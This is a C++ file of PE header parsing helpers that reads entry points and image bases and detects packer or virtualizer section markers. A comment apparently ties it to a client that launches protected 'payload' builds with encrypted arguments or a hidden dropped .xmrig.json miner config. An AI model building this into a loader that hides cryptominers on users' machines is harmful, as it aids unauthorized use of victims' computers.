#include "../include/pe_hdrs_helper.h"

BYTE* get_nt_hrds(const BYTE *pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;

    if (pe_offset > kMaxOffset) return NULL;

    IMAGE_NT_HEADERS32 *inh = (IMAGE_NT_HEADERS32 *)(pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    return (BYTE*)inh;
}

WORD get_pe_architecture(const BYTE *pe_buffer)
{
    void *ptr = get_nt_hrds(pe_buffer);
    if (ptr == NULL) return 0;

    IMAGE_NT_HEADERS32 *inh = static_cast<IMAGE_NT_HEADERS32*>(ptr);
    return inh->FileHeader.Machine;
}

WORD get_nt_hdr_architecture(IN const BYTE *pe_buffer)
{
    void *ptr = get_nt_hrds(pe_buffer);
    if (!ptr) return 0;

    IMAGE_NT_HEADERS32 *inh = static_cast<IMAGE_NT_HEADERS32*>(ptr);
    return inh->OptionalHeader.Magic;
}

DWORD get_entry_point_rva(const BYTE *pe_buffer)
{
    WORD arch = get_pe_architecture(pe_buffer);
    BYTE* payload_nt_hdr = get_nt_hrds(pe_buffer);
    if (payload_nt_hdr == NULL) {
        return 0;
    }
        DWORD ep_addr = 0;
    if (arch == IMAGE_FILE_MACHINE_AMD64) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        ep_addr = payload_nt_hdr64->OptionalHeader.AddressOfEntryPoint;
    } else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        ep_addr = static_cast<ULONGLONG>(payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint);
    }
    return ep_addr;
}

ULONGLONG get_image_base(const BYTE *pe_buffer)
{
    BYTE* payload_nt_hdr = get_nt_hrds(pe_buffer);
    if (payload_nt_hdr == NULL) {
        return 0;
    }
    if (get_nt_hdr_architecture(pe_buffer) == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        IMAGE_NT_HEADERS64* h64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        return h64->OptionalHeader.ImageBase;
    }
    IMAGE_NT_HEADERS32* h32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
    return static_cast<ULONGLONG>(h32->OptionalHeader.ImageBase);
}

bool pe_is64bit(IN const BYTE *pe_buffer)
{
    WORD arch = get_nt_hdr_architecture(pe_buffer);
    if (arch == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return true;
    }
    return false;
}

// Detect whether a payload has been processed by a binary packer/virtualizer.
// These protectors append marker section names (VMProtect-style .NotHid/.pack,
// Themida/.fptable, plus common virtualizer helper sections) that a plain build
// never contains. The client uses this to choose an argument-delivery strategy:
// --encargs is passed to plain builds, but virtualized builds crash inside the
// protected arg-rebuild path (STATUS_DATATYPE_MISALIGNMENT), so those get a
// dropped %USERPROFILE%\.xmrig.json config instead.
bool pe_is_virtualized(const BYTE *pe_buffer)
{
    BYTE* payload_nt_hdr = get_nt_hrds(pe_buffer);
    if (payload_nt_hdr == NULL) return false;

    WORD machine = get_pe_architecture(pe_buffer);
    WORD magic   = get_nt_hdr_architecture(pe_buffer);
    if (magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC && magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) return false;

    DWORD numberOfSections = 0;
    DWORD optSize = 0;
    DWORD sectionRva = 0;
    if (machine == IMAGE_FILE_MACHINE_AMD64) {
        IMAGE_NT_HEADERS64* h = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        numberOfSections = h->FileHeader.NumberOfSections;
        optSize          = h->FileHeader.SizeOfOptionalHeader;
        sectionRva       = ((BYTE*)&h->OptionalHeader - (BYTE*)payload_nt_hdr) + optSize;
    } else {
        IMAGE_NT_HEADERS32* h = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        numberOfSections = h->FileHeader.NumberOfSections;
        optSize          = h->FileHeader.SizeOfOptionalHeader;
        sectionRva       = ((BYTE*)&h->OptionalHeader - (BYTE*)payload_nt_hdr) + optSize;
    }

    const char* markers[] = {
        ".NotHid", ".pack", ".fptable", "_TEXT_CN", ".vmp", ".vmp0",
        ".vmp1", ".themd", ".themida", ".Enigma", ".Upack",
    };
    const int kMarkerCount = sizeof(markers) / sizeof(markers[0]);

    for (DWORD i = 0; i < numberOfSections; ++i) {
        IMAGE_SECTION_HEADER* s = (IMAGE_SECTION_HEADER*)((BYTE*)payload_nt_hdr + sectionRva + i * sizeof(IMAGE_SECTION_HEADER));
        char name[9] = { 0 };
        memcpy(name, s->Name, 8);
        for (int m = 0; m < kMarkerCount; ++m) {
            if (strncmp(name, markers[m], 8) == 0 || memcmp(name, markers[m], strlen(markers[m])) == 0) {
                return true;
            }
        }
    }
    return false;
}
